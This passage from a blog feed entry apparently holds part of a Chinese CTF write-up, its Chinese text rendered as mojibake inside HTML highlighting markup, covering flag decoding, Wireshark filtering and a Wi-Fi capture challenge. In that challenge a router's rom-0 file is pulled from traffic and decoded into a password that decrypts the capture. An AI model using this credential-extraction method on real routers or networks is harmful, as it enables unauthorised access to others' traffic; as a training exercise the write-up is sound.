punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>æ™¬<span class="token number">61677b6368</span>æ™¬ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x666c</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>ã…°<span class="token number">74756e65</span>ã…° <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x3170</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>å¼µ<span class="token number">337665727c</span>å¼µ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x5f35</span><span class="token comment" spellcheck="true">#è¿›è¡Œæ‹¼æ¥</span><span class="token number">666c61677b6368317074756e655f35337665727c</span><span class="token comment" spellcheck="true">#å¯ä»¥å¾—åˆ°</span>flag<span class="token punctuation">{</span>ch1ptune_53ver<span class="token operator">|</span><span class="token comment" spellcheck="true">#æäº¤ch1ptune_53verå³å¯</span></code></pre><h3 id="Misc5-ç¥ç§˜çš„æ–‡ä»¶å-æœªè§£å‡º"><a href="#Misc5-ç¥ç§˜çš„æ–‡ä»¶å-æœªè§£å‡º" class="headerlink" title="Misc5-ç¥ç§˜çš„æ–‡ä»¶å(æœªè§£å‡º)"></a>Misc5-ç¥ç§˜çš„æ–‡ä»¶å(æœªè§£å‡º)</h3><blockquote><p> å¯ä»¥é€šè¿‡binwalkå¾—åˆ°ä¸€ä¸ªé€†å‘é¢˜ï¼Œè¾ƒéš¾ï¼Œæœªè§£å‡ºã€‚</p></blockquote><h2 id="ç½‘ç»œåè®®åˆ†æ"><a href="#ç½‘ç»œåè®®åˆ†æ" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ"></a>ç½‘ç»œåè®®åˆ†æ</h2><h3 id="ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦"><a href="#ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦~"></a>ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦~</h3><blockquote><p>wiresharkæ‰“å¼€æ•°æ®åŒ…åï¼Œä¾æ¬¡ä½¿ç”¨ä»¥ä¸‹è¿‡æ»¤è§„åˆ™:<br><code>http contains flag</code></p><p><code>tcp contains flag</code></p><p><code>udp contains flag</code></p><p>å³å¯é€šè¿‡<code>udp contains flag</code>æŸ¥åˆ°flagã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5eaff1fee2.png" class="lazyload"></p></blockquote><h3 id="ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿-æœªè§£å‡º"><a href="#ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿-æœªè§£å‡º" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿(æœªè§£å‡º)"></a>ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿(æœªè§£å‡º)</h3><blockquote><p>ç»è¿‡ç–¯ç‹‚æ‰‹åŠ¨æå–åå‘ç°åªèƒ½è·å¾—ä¸€ä¸å›¾ç‰‡ï¼Œèµ›åå¾—çŸ¥éœ€è¦ç”¨<strong>tcpflow</strong>è¿™ä¸ªç¥å™¨é‡æ„æŸå®³çš„tcpæ•°æ®ï¼Œä»è€Œå¾—åˆ°å›¾åƒã€‚</p></blockquote><h3 id="ç½‘ç»œåè®®åˆ†æ3-thief"><a href="#ç½‘ç»œåè®®åˆ†æ3-thief" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ3-thief"></a>ç½‘ç»œåè®®åˆ†æ3-thief</h3><blockquote><p>æ‹¿åˆ°æ•°æ®åŒ…æ‰“å¼€åå‘ç°å¤§éƒ¨åˆ†éƒ½æ˜¯<code>802.11 wlan</code>æ•°æ®åŒ…ï¼Œè¿‡æ»¤ä¸€ä¸‹httpè¯·æ±‚ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ebef87b2d.png" class="lazyload"></p><p>å¯ä»¥å‘ç°ç¬¬ä¸€ä¸ªè¯·æ±‚çš„æ˜¯<code>/rom-0</code>ï¼Œç¡®å®ä¸çŸ¥ä¸ºä½•å°±è§‰å¾—è¿™ä¸ªæ˜¯å…³é”®ï¼Œgoogleæœç´¢ä¸€ä¸‹ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ed05ddbaa.png" class="lazyload"></p><p>ç‚¹è¿›routerPwnå‘ç°æ˜¯ä¸€ä¸ªè§£å‹rom-0æ–‡ä»¶çš„ç½‘å€ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯è¿˜ç¼ºä¸€ä¸ªæ–‡ä»¶ã€‚æ¥ä¸‹æ¥é€šè¿‡å¯¼å‡ºhttpå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€ä¸ªrom0æ–‡ä»¶ï¼Œæ­£å¥½å°†å…¶è§£å¯†å¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#çŒœæµ‹æ˜¯ç”¨æ¥è§£å¯†çš„å¯†é’¥å’¯</span>Rome4040TP<span class="token operator">-</span>LINKpublicpublicpublicpublic</code></pre><p>åœ¨è¿ç”¨wiresharkåˆ†ææµé‡çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬ç»å¸¸éœ€è¦ä½¿ç”¨å¯†é’¥ä¹‹ç±»çš„ä¸œè¥¿æ¥è§£å¯†æµé‡ï¼Œæ­¤å¤„åŒæ ·é€šè¿‡ <a href="https://blog.csdn.net/neal_hddnwpu/article/details/82586235?utm_source=blogxgwz2" target="_blank" rel="noopener">æŸ¥è¯¢èµ„æ–™</a> å¯ä»¥è·å¾—è§£å¯†æ–¹å¼ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5eefeb803c.png" class="lazyload"></p><p>å°†å¯†ç Rome4040å¯¼å…¥è§£å¯†ï¼Œå¯ä»¥å‘ç°çš„ç¡®å‡ºç°äº†<strong>å¾ˆå¤šhttpå’Œtcpçš„åŒ…</strong>ï¼Œæ ¹æ®é¢˜ç›®æç¤ºä½¿ç”¨è¿‡æ»¤<code>http contains CTF</code>å¾—åˆ°flagï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ef72cfc64.png" class="lazyload"></p></blockquote><blockquote><p>ğŸ†’wandoucup-CTF-WPåˆ°æ­¤ç»“æŸã€‚</p><p>Publish by Yof3ngğŸ‘Œã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€¦â€¦&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="æµé‡åˆ†æ" scheme="http://www.yof3ng.xyz/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
